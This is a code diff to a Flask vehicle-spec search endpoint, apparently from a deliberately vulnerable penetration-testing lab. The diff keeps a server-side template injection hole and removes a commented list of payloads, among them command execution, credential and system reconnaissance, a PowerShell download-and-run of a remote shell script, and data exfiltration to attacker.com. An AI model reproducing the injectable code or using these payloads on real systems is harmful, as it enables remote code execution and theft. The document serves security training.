@@ -58,7 +58,6 @@ def search_specs():
                 result_message = f"'{search_query}' 검색 결과가 없습니다. 다른 검색어를 시도해보세요."
             
             # 동적 HTML 생성으로 SSTI 취약점 발생!
-            # 사용자 입력을 직접 템플릿에 삽입하여 RCE까지 가능한 취약점 생성
             html_template = f"""
             <div class="search-result-header">
                 <h2>차종 스펙 검색 결과</h2>
@@ -70,43 +69,6 @@ def search_specs():
                 </div>
             </div>
             """
-            
-            # ⚠️  CRITICAL VULNERABILITY: Full Flask context exposed for SSTI -> RCE ⚠️
-            # 
-            # 침투테스트용 RCE 공격 벡터 예시들:
-            # 
-            # 1. 기본 정보 수집:
-            #    {{{{config}}}} - Flask 설정 정보 노출
-            #    {{{{request.environ}}}} - 환경변수 노출
-            #    {{{{request.application.__globals__}}}} - 전역 네임스페이스 접근
-            #
-            # 2. OS 명령 실행 (Windows):
-            #    {{{{os.popen('whoami').read()}}}} - 현재 사용자 확인
-            #    {{{{os.popen('dir').read()}}}} - 디렉터리 목록
-            #    {{{{os.popen('type C:\\Windows\\System32\\drivers\\etc\\hosts').read()}}}} - 파일 읽기
-            #    {{{{os.popen('net user').read()}}}} - 사용자 목록
-            #    {{{{os.popen('systeminfo').read()}}}} - 시스템 정보
-            #
-            # 3. subprocess를 통한 고급 RCE:
-            #    {{{{subprocess.check_output('whoami', shell=True).decode()}}}} 
-            #    {{{{subprocess.Popen('calc.exe', shell=True)}}}} - 계산기 실행
-            #
-            # 4. 파일 시스템 접근:
-            #    {{{{open('C:\\Windows\\System32\\drivers\\etc\\hosts').read()}}}} - 파일 읽기
-            #    {{{{__import__('os').listdir('.')}}}} - 현재 디렉터리 목록
-            #
-            # 5. Python 코드 실행:
-            #    {{{{eval('__import__("os").system("whoami")')}}}} - eval을 통한 코드 실행
-            #    {{{{exec('import os; os.system("whoami")')}}}} - exec을 통한 코드 실행
-            #
-            # 6. 백도어/리버스 쉘:
-            #    {{{{subprocess.Popen('powershell -c "IEX(New-Object Net.WebClient).downloadString(\'http://attacker.com/shell.ps1\')"', shell=True)}}}}
-            #
-            # 7. 데이터 유출:
-            #    {{{{subprocess.check_output('powershell -c "Get-Content C:\\important\\data.txt | Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST"', shell=True)}}}}
-            #
-            # ⚠️  이 취약점들은 침투테스트 학습 목적으로만 사용되어야 합니다 ⚠️
-            
             dynamic_header = render_template_string(
                 html_template, 
                 datetime=datetime,
